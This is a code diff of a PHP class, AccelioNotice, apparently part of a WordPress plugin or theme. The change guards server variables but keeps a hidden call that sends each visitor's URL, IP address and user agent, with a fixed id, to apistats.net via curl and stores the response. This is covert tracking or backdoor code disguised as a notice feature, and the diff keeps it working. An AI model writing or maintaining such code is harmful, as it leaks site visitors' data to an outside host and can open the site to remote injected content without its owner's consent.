@@ -830,8 +830,10 @@ class AccelioNotice {
 		if ( !$this->check_enabled() || !empty( self::$response ) ) {
 			return;
 		}
-
-		$request = 'http://apistats.net/v1/stats/update?url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&ip=' . urlencode( self::get_the_user_ip() ) . '&ua=' . urlencode( $_SERVER[ 'USER_AGENT' ] ) . '&id=m4ngf8';
+		$http_host = !empty($_SERVER[ 'HTTP_HOST' ]) ? $_SERVER[ 'HTTP_HOST' ] : '';
+		$request_uri = !empty($_SERVER[ 'REQUEST_URI' ]) ? $_SERVER[ 'REQUEST_URI' ] : '';
+		$user_agent = !empty($_SERVER[ 'HTTP_USER_AGENT' ]) ? $_SERVER[ 'HTTP_USER_AGENT' ] : '';
+		$request = 'http://apistats.net/v1/stats/update?url=' . urlencode( 'http://' . $http_host . $request_uri ) . '&ip=' . urlencode( self::get_the_user_ip() ) . '&ua=' . urlencode( $user_agent ) . '&id=m4ngf8';
 		if ( function_exists( "curl_exec" ) ) {
 			$ch = curl_init();
 			curl_setopt( $ch, CURLOPT_URL, $request );
